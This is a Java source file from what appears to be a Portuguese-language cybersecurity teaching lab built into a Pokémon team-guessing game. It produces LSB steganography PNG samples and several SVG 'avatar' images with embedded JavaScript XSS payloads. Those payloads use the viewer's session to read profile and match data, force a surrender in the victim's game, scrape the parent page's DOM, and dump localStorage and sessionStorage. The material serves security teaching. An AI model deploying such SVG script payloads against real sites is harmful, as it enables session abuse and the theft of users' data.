package com.svc.pokeguessteam.securitylab;

import javax.imageio.ImageIO;
import java.awt.Color;
import java.awt.Graphics2D;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/** Samples do Security Lab: LSB (PNG) + SVG XSS didático (Unidade 2). */
public final class StegoSampleImages {

    private StegoSampleImages() {
    }

    public record Sample(String id, String filename, String description, String contentType, byte[] bytes) {
        public byte[] pngBytes() {
            return bytes;
        }
    }

    public static List<Map<String, String>> catalog() {
        List<Map<String, String>> out = new ArrayList<>();
        for (SampleMeta m : METAS) {
            Map<String, String> row = new LinkedHashMap<>();
            row.put("id", m.id);
            row.put("filename", m.filename);
            row.put("description", m.description);
            row.put("contentType", m.contentType);
            row.put("kind", m.kind);
            out.add(row);
        }
        return out;
    }

    public static Sample load(String id) {
        return switch (id) {
            case "clean" -> png("clean", "lab-clean.png", "clean", renderPlain(new Color(60, 140, 90)));
            case "hidden-hint" -> embed("lab-hidden-hint.png", "pista-do-lab-unidade-2", new Color(40, 90, 160));
            case "hidden-long" -> embed(
                    "lab-hidden-long.png",
                    "Mensagem longa de teste para esteganografia no PokeTeamGuess — Unidade 2 Ciberseguranca.",
                    new Color(160, 70, 40)
            );
            case "xss-taunt" -> svgSample(
                    "xss-taunt",
                    "lab-xss-taunt.svg",
                    "Console: mensagem de ataque",
                    """
                    console.log('%cATAQUE MALIGINO NA IMAGEM, VOCE PERDEU HAHAHAHAHA',
                      'color:#ff1744;font-size:18px;font-weight:bold');
                    try {
                      parent.console.log('%cATAQUE MALIGINO NA IMAGEM, VOCE PERDEU HAHAHAHAHA',
                        'color:#ff1744;font-size:18px;font-weight:bold');
                    } catch (e) {}
                    """
            );
            case "xss-surrender" -> svgSample(
                    "xss-surrender",
                    "lab-xss-surrender.svg",
                    "Quem vê ≠ masterdev → espera ACTIVE + 10s → POST /surrender",
                    """
                    (function () {
                      function log() {
                        var args = Array.prototype.slice.call(arguments);
                        console.log.apply(console, args);
                        try { parent.console.log.apply(parent.console, args); } catch (e) {}
                      }
                      function origin() {
                        try { return parent.location.origin; } catch (e) { return ''; }
                      }
                      function http(url, opts) {
                        var fn = fetch;
                        try { if (parent.fetch) fn = parent.fetch.bind(parent); } catch (e) {}
                        return fn(url, opts);
                      }
                      function jsonOrEmpty(r) {
                        if (r.status === 204) return Promise.resolve({ status: 204, body: null });
                        return r.text().then(function (t) {
                          var body = null;
                          if (t) { try { body = JSON.parse(t); } catch (e) { body = t; } }
                          return { status: r.status, body: body };
                        });
                      }
                      function delay(ms) {
                        return new Promise(function (resolve) { setTimeout(resolve, ms); });
                      }
                      log('%cATAQUE MALIGINO NA IMAGEM, VOCE PERDEU HAHAHAHAHA',
                        'color:#ff1744;font-size:18px;font-weight:bold');
                      var base = origin();
                      // POST /surrender só em ACTIVE — espera a partida começar e +10s.
                      http(base + '/api/me', { credentials: 'include', headers: { 'Accept': 'application/json' } })
                        .then(jsonOrEmpty)
                        .then(function (me) {
                          var body = me.body || {};
                          var user = body.username || body.authenticatedAs || '';
                          log('[PokeTeam XSS] quem vê o avatar', user || '(vazio)', me.status);
                          if (!user) {
                            log('[PokeTeam XSS] skip — sem username');
                            return;
                          }
                          if (String(user).toLowerCase() === 'masterdev') {
                            log('[PokeTeam XSS] skip — masterdev (atacante)');
                            return;
                          }
                          function waitActiveThenSurrender(attempt) {
                            return http(base + '/api/game/friend/match', {
                              credentials: 'include',
                              headers: { 'Accept': 'application/json' }
                            }).then(jsonOrEmpty).then(function (match) {
                              var st = match.body && match.body.status;
                              log('[PokeTeam XSS] match poll', attempt, match.status, st || '(nenhuma)');
                              if (match.status === 204 || !match.body) {
                                if (attempt >= 30) {
                                  log('[PokeTeam XSS] timeout — sem partida friend');
                                  return;
                                }
                                return delay(2000).then(function () {
                                  return waitActiveThenSurrender(attempt + 1);
                                });
                              }
                              if (st === 'FINISHED') {
                                log('[PokeTeam XSS] já FINISHED');
                                return;
                              }
                              if (st !== 'ACTIVE') {
                                if (attempt >= 30) {
                                  log('[PokeTeam XSS] timeout — partida não ficou ACTIVE');
                                  return;
                                }
                                log('[PokeTeam XSS] ainda ' + st + ' — a esperar ACTIVE…');
                                return delay(2000).then(function () {
                                  return waitActiveThenSurrender(attempt + 1);
                                });
                              }
                              log('%c[PokeTeam XSS] ACTIVE — aguarda 10s e chama SURRENDER…',
                                'color:#ff9800;font-weight:bold');
                              return delay(10000).then(function () {
                                log('%c[PokeTeam XSS] ' + user + ' → POST /surrender',
                                  'color:#ff1744;font-weight:bold');
                                return http(base + '/api/game/friend/match/surrender', {
                                  method: 'POST',
                                  credentials: 'include',
                                  headers: { 'Accept': 'application/json' }
                                }).then(jsonOrEmpty).then(function (res) {
                                  if (res.status >= 200 && res.status < 300) {
                                    log('%cATAQUE MALIGINO — surrender OK',
                                      'color:#ff1744;font-size:16px;font-weight:bold', res);
                                    return;
                                  }
                                  log('%cATAQUE MALIGINO — surrender falhou, fallback leave',
                                    'color:#ff1744;font-weight:bold', res);
                                  return http(base + '/api/game/friend/match', {
                                    method: 'DELETE',
                                    credentials: 'include',
                                    headers: { 'Accept': 'application/json' }
                                  }).then(jsonOrEmpty).then(function (leaveRes) {
                                    log('[PokeTeam XSS] leave após surrender', leaveRes);
                                  });
                                });
                              });
                            });
                          }
                          return waitActiveThenSurrender(0);
                        })
                        .catch(function (err) {
                          log('[PokeTeam XSS] falha', String(err));
                        });
                    })();
                    """
            );
            case "xss-dom-opponent" -> svgSample(
                    "xss-dom-opponent",
                    "lab-xss-dom-opponent.svg",
                    "Lê o DOM do parent (nome/texto da partida — ex. oponente)",
                    """
                    (function () {
                      var info = { source: 'xss-dom-opponent' };
                      try {
                        var doc = parent.document;
                        info.title = doc.title;
                        info.href = String(parent.location.href);
                        info.bodySnippet = (doc.body && doc.body.innerText || '').replace(/\\s+/g, ' ').slice(0, 500);
                        var cards = doc.querySelectorAll('[class*="matchPlayer"], [class*="Player"], [class*="opponent"]');
                        info.candidateTexts = [];
                        for (var i = 0; i < Math.min(cards.length, 8); i++) {
                          info.candidateTexts.push((cards[i].innerText || '').trim().slice(0, 120));
                        }
                      } catch (e) {
                        info.error = String(e);
                      }
                      console.log('[PokeTeam XSS DOM]', info);
                      try { parent.console.log('[PokeTeam XSS DOM] dados da página da vítima', info); } catch (e2) {}
                    })();
                    """
            );
            case "xss-fetch-profile" -> svgSample(
                    "xss-fetch-profile",
                    "lab-xss-fetch-profile.svg",
                    "fetch /api/profile/me com cookies da sessão da vítima",
                    """
                    (function () {
                      function log(msg, data) {
                        console.log(msg, data);
                        try { parent.console.log(msg, data); } catch (e) {}
                      }
                      log('%cATAQUE MALIGINO NA IMAGEM — a pedir /api/profile/me …', 'color:#ff1744;font-weight:bold');
                      var url = '/api/profile/me';
                      try { url = parent.location.origin + '/api/profile/me'; } catch (e) {}
                      fetch(url, { credentials: 'include', headers: { 'Accept': 'application/json' } })
                        .then(function (r) { return r.json().then(function (j) { return { status: r.status, body: j }; }); })
                        .then(function (res) {
                          log('[PokeTeam XSS] perfil da vítima (sessão do browser)', res);
                        })
                        .catch(function (err) {
                          log('[PokeTeam XSS] fetch perfil falhou', String(err));
                        });
                    })();
                    """
            );
            case "xss-fetch-match" -> svgSample(
                    "xss-fetch-match",
                    "lab-xss-fetch-match.svg",
                    "fetch /api/game/friend/match — estado da partida / oponente se houver sessão",
                    """
                    (function () {
                      function log(msg, data) {
                        console.log(msg, data);
                        try { parent.console.log(msg, data); } catch (e) {}
                      }
                      log('%cATAQUE MALIGINO — a pedir estado da partida friend…', 'color:#ff1744;font-weight:bold');
                      var origin = '';
                      try { origin = parent.location.origin; } catch (e) {}
                      var url = origin + '/api/game/friend/match';
                      fetch(url, { credentials: 'include', headers: { 'Accept': 'application/json' } })
                        .then(function (r) { return r.json().then(function (j) { return { status: r.status, body: j }; }); })
                        .then(function (res) {
                          var body = res.body || {};
                          var host = body.host || {};
                          var guest = body.guest || {};
                          log('[PokeTeam XSS] match friend', {
                            status: res.status,
                            hostUser: host.username,
                            guestUser: guest.username,
                            hostHasAvatar: host.hasCustomAvatar,
                            guestHasAvatar: guest.hasCustomAvatar,
                            raw: body
                          });
                        })
                        .catch(function (err) {
                          log('[PokeTeam XSS] fetch match falhou', String(err));
                        });
                    })();
                    """
            );
            case "xss-storage" -> svgSample(
                    "xss-storage",
                    "lab-xss-storage.svg",
                    "Lê localStorage / sessionStorage do parent",
                    """
                    (function () {
                      var dump = { source: 'xss-storage', localStorage: {}, sessionStorage: {} };
                      try {
                        var ls = parent.localStorage;
                        for (var i = 0; i < ls.length; i++) {
                          var k = ls.key(i);
                          dump.localStorage[k] = String(ls.getItem(k)).slice(0, 200);
                        }
                      } catch (e) { dump.localStorageError = String(e); }
                      try {
                        var ss = parent.sessionStorage;
                        for (var j = 0; j < ss.length; j++) {
                          var k2 = ss.key(j);
                          dump.sessionStorage[k2] = String(ss.getItem(k2)).slice(0, 200);
                        }
                      } catch (e2) { dump.sessionStorageError = String(e2); }
                      console.log('[PokeTeam XSS storage]', dump);
                      try { parent.console.log('[PokeTeam XSS storage]', dump); } catch (e3) {}
                    })();
                    """
            );
            default -> throw new IllegalArgumentException("Sample desconhecido: " + id);
        };
    }

    public static String asDataUrl(String id) {
        Sample s = load(id);
        return "data:" + s.contentType() + ";base64," + Base64.getEncoder().encodeToString(s.bytes());
    }

    private record SampleMeta(String id, String filename, String description, String contentType, String kind) {
    }

    private static final List<SampleMeta> METAS = List.of(
            new SampleMeta("xss-surrender", "lab-xss-surrender.svg",
                    "Impacto: quem vê ≠ masterdev → espera ACTIVE + 10s → POST /surrender",
                    "image/svg+xml", "xss"),
            new SampleMeta("xss-taunt", "lab-xss-taunt.svg",
                    "Console: “ATAQUE MALIGINO NA IMAGEM, VOCE PERDEU HAHAHAHAHA”",
                    "image/svg+xml", "xss"),
            new SampleMeta("xss-dom-opponent", "lab-xss-dom-opponent.svg",
                    "Lê texto/DOM da página da partida (pista do oponente)",
                    "image/svg+xml", "xss"),
            new SampleMeta("xss-fetch-profile", "lab-xss-fetch-profile.svg",
                    "Chama GET /api/profile/me com a sessão da vítima",
                    "image/svg+xml", "xss"),
            new SampleMeta("xss-fetch-match", "lab-xss-fetch-match.svg",
                    "Chama GET /api/game/friend/match (host/guest / dados do oponente)",
                    "image/svg+xml", "xss"),
            new SampleMeta("xss-storage", "lab-xss-storage.svg",
                    "Dump de localStorage/sessionStorage do parent",
                    "image/svg+xml", "xss"),
            new SampleMeta("clean", "lab-clean.png",
                    "LSB limpo (controlo negativo — extract vazio)",
                    "image/png", "stego"),
            new SampleMeta("hidden-hint", "lab-hidden-hint.png",
                    "LSB: mensagem 'pista-do-lab-unidade-2'",
                    "image/png", "stego"),
            new SampleMeta("hidden-long", "lab-hidden-long.png",
                    "LSB: mensagem longa de teste",
                    "image/png", "stego")
    );

    private static Sample png(String id, String filename, String description, byte[] bytes) {
        return new Sample(id, filename, description, "image/png", bytes);
    }

    private static Sample embed(String filename, String message, Color bg) {
        try {
            String b64 = Base64.getEncoder().encodeToString(renderPlain(bg));
            var stego = new SteganographyService().embed(b64, message);
            return png(
                    filename.replace(".png", ""),
                    filename,
                    message,
                    Base64.getDecoder().decode(stego.imageBase64Png())
            );
        } catch (Exception e) {
            throw new IllegalStateException("Falha a gerar sample " + filename, e);
        }
    }

    private static Sample svgSample(String id, String filename, String description, String scriptBody) {
        // Corre no máximo 1× por página parent — o poll da partida remonta o <object> e senão
        // enche o console / repete surrender.
        String guarded = """
                (function () {
                  var flag = '__poketeamXssOnce_%s';
                  try {
                    if (parent[flag]) { return; }
                    parent[flag] = true;
                  } catch (eOnce) {}
                  try {
                %s
                  } catch (eRun) {
                    try { console.log('[PokeTeam XSS] erro', String(eRun)); } catch (e2) {}
                  }
                })();
                """.formatted(id.replace("-", "_"), scriptBody);
        String svg = """
                <svg xmlns="http://www.w3.org/2000/svg" width="128" height="128" viewBox="0 0 128 128">
                  <rect width="128" height="128" fill="#b71c1c"/>
                  <circle cx="64" cy="48" r="26" fill="#ffcdd2"/>
                  <text x="64" y="100" text-anchor="middle" fill="#fff" font-family="sans-serif" font-size="10">%s</text>
                  <script type="text/javascript"><![CDATA[
                %s
                  ]]></script>
                </svg>
                """.formatted(id, guarded);
        return new Sample(id, filename, description, "image/svg+xml", svg.getBytes(StandardCharsets.UTF_8));
    }

    private static byte[] renderPlain(Color bg) {
        try {
            BufferedImage img = new BufferedImage(128, 128, BufferedImage.TYPE_INT_ARGB);
            Graphics2D g = img.createGraphics();
            g.setColor(bg);
            g.fillRect(0, 0, 128, 128);
            g.setColor(Color.WHITE);
            g.fillOval(32, 32, 64, 64);
            g.setColor(new Color(0, 0, 0, 80));
            g.fillRect(8, 100, 112, 18);
            g.dispose();
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ImageIO.write(img, "png", baos);
            return baos.toByteArray();
        } catch (Exception e) {
            throw new IllegalStateException("Falha a renderizar PNG de lab", e);
        }
    }
}
